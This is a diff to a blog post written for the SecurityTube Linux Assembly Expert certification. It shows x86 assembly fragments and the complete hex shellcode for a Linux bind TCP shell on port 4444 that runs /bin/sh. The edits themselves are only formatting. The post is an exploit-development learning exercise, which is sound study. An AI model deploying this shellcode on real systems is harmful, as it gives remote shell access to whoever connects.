@@ -7,13 +7,13 @@ tags: [slae32, assembly, x86, Bind TCP Shell]
 image: /assets/img/post/slae32/slae32.png
 ---
 
-<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:
+<b>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</b>
 
-http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/
+<b>http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</b>
 
-Student ID: SLAE-1542</b>
+<b>Student ID: SLAE-1542</b>
 
-Github: https://github.com/bigb0sss/SLAE32/tree/master/Assignment_1
+Github: https://github.com/bigb0sss/SLAE32/tree/master/Assignment_%231
 
 
 # Assignement #1 
@@ -124,15 +124,15 @@ Additionally, by looking at `/usr/include/linux/net.h`, we can also obtain args 
 ```console
 root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | grep SYS
 #define SYS_SOCKET	1		/* sys_socket(2)	*/
-#define SYS_BIND	2		/* sys_bind(2)	*/
+#define SYS_BIND	2		/* sys_bind(2)		*/
 #define SYS_CONNECT	3		/* sys_connect(2)	*/
 #define SYS_LISTEN	4		/* sys_listen(2)	*/
 #define SYS_ACCEPT	5		/* sys_accept(2)	*/
 #define SYS_GETSOCKNAME	6		/* sys_getsockname(2)	*/
 #define SYS_GETPEERNAME	7		/* sys_getpeername(2)	*/
 #define SYS_SOCKETPAIR	8		/* sys_socketpair(2)	*/
-#define SYS_SEND	9		/* sys_send(2)	*/
-#define SYS_RECV	10		/* sys_recv(2)	*/
+#define SYS_SEND	9		/* sys_send(2)		*/
+#define SYS_RECV	10		/* sys_recv(2)		*/
 #define SYS_SENDTO	11		/* sys_sendto(2)	*/
 #define SYS_RECVFROM	12		/* sys_recvfrom(2)	*/
 #define SYS_SHUTDOWN	13		/* sys_shutdown(2)	*/
@@ -149,7 +149,7 @@ root@kali:~/Documents/SLAE32/Exam/Assignement1# cat /usr/include/linux/net.h | g
 
 First, let's zero out some of the registers we are going to use:
 
-```
+```s
 global _start
 
 section		.text
@@ -166,7 +166,7 @@ xor edx, edx
 
 Let's create the `socket()` shellcode:
 
-```
+```s
 ; 1) Socket Creation
 ; sockfd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -184,7 +184,7 @@ mov edi, eax		; Save the sockfd to EDI
 
 Let's create the server address `struct` shellcode:
 
-```
+```s
 ; 	struct sockaddr_in addr;
 ;	addr.sin_family = AF_INET; 
 ;	addr.sin_port = htons(port);	//4444
@@ -202,7 +202,7 @@ mov esi, esp	; Move stack pointer to ESI
 
 Let's create the `bind()` shellcode:
 
-```
+```s
 ; 2) Bind
 ; bind(sockfd, (struct sockaddr *) &addr, sizeof(addr));
 
@@ -220,7 +220,7 @@ int 0x80		; Execute SYS_BIND
 
 Let's create the `listen()` shellcode:
 
-```
+```s
 ; 3) Listen
 ; listen(sockfd, 0);
 
@@ -237,7 +237,7 @@ int 0x80		; Execute SYS_LISTEN
 
 Let's create the `accept()` shellcode:
 
-```
+```s
 ; 4) Accept
 ; acceptfd = accept(sockfd, NULL, NULL);
 
@@ -256,7 +256,7 @@ mov edi, eax
 
 Let's create the `dup2()` shellcode:
 
-```
+```s
 ; 5) Dup2 - Input and Output Redriection
 ; dup2(acceptfd, 0);	// stdin
 ; dup2(acceptfd, 1);	// stdout
@@ -280,7 +280,7 @@ jnz loop		; Jump back to the beginning of the loop until CL is set to zero flag
 
 Let's create the `execve()` shellcode:
 
-```
+```s
 ; 6) Execve
 ; execve("/bin/sh", NULL, NULL);
 
@@ -300,7 +300,7 @@ int 0x80		; Execute SYS_EXECVE
 
 Let's put everything togeter and test the shellcode.
 
-```
+```s
 global _start
 
 section		.text
@@ -424,15 +424,6 @@ root@kali:~/Documents/SLAE32/Exam/Assignement1# python compilerX86.py -f bind-tc
 [+] Linking: bind-tcp-shell.o
 [+] Shellcode: "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc7\x52\x52\x52\x66\x68\x11\x5c\x66\x6a\x02\x89\xe6\xb0\x66\xb3\x02\x6a\x10\x56\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x57\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x52\x52\x57\x89\xe1\xcd\x80\x89\xc7\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\x75\xf4\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80"
 [+] Creating File: shellcode.c
-[*] gcc warning (if any):
-
-shellcode.c:4:24: warning: backslash and newline separated by space
-    4 | unsigned char code[] = \
-      |                         
-shellcode.c:6:1: warning: return type defaults to ‘int’ [-Wimplicit-int]
-    6 | main()
-      | ^~~~
-
 [+] Compiling Executable: shellcode
 [+] Enjoy!
 ```
